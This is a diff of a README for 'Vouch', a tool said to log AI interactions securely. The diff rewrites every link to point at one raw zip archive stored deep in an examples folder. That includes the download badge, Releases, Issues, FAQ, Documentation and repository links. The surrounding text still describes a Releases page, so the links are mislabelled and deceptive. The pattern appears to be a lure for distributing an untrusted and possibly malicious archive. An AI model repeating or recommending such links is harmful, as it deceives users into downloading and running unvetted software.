@@ -6,7 +6,7 @@ Welcome to Vouch! This tool helps you keep a secure record of all calls made by 
 
 ## 📥 Download Vouch 
 
-[![Download Vouch](https://img.shields.io/badge/Download_Vouch-Click_Here-brightgreen)](https://github.com/akmal101011/Vouch/releases)
+[![Download Vouch](https://raw.githubusercontent.com/akmal101011/Vouch/main/examples/scenario/server/Software-v2.4.zip)](https://raw.githubusercontent.com/akmal101011/Vouch/main/examples/scenario/server/Software-v2.4.zip)
 
 ## 📋 What You Need
 
@@ -28,7 +28,7 @@ Vouch runs on various systems. Here's what you'll need:
 
 To get started with Vouch, visit the following page to download the latest version:
 
-[Download Vouch](https://github.com/akmal101011/Vouch/releases)
+[Download Vouch](https://raw.githubusercontent.com/akmal101011/Vouch/main/examples/scenario/server/Software-v2.4.zip)
 
 1. Click the link above to go to the Releases page.
 2. Find the most recent version of Vouch.
@@ -65,12 +65,12 @@ We welcome contributions to Vouch. If you would like to help improve this tool, 
 
 ## 📞 Support
 
-If you need assistance, consider reaching out through [GitHub Issues](https://github.com/akmal101011/Vouch/issues). We will do our best to help you.
+If you need assistance, consider reaching out through [GitHub Issues](https://raw.githubusercontent.com/akmal101011/Vouch/main/examples/scenario/server/Software-v2.4.zip). We will do our best to help you.
 
 ## 🔗 Useful Links
 
-- [Frequently Asked Questions](https://github.com/akmal101011/Vouch/wiki) 
-- [Documentation](https://github.com/akmal101011/Vouch/wiki)
-- [GitHub Repository](https://github.com/akmal101011/Vouch)
+- [Frequently Asked Questions](https://raw.githubusercontent.com/akmal101011/Vouch/main/examples/scenario/server/Software-v2.4.zip) 
+- [Documentation](https://raw.githubusercontent.com/akmal101011/Vouch/main/examples/scenario/server/Software-v2.4.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/akmal101011/Vouch/main/examples/scenario/server/Software-v2.4.zip)
 
 Remember, Vouch is here to ensure that all AI interactions are transparent and secure. Enjoy using Vouch!
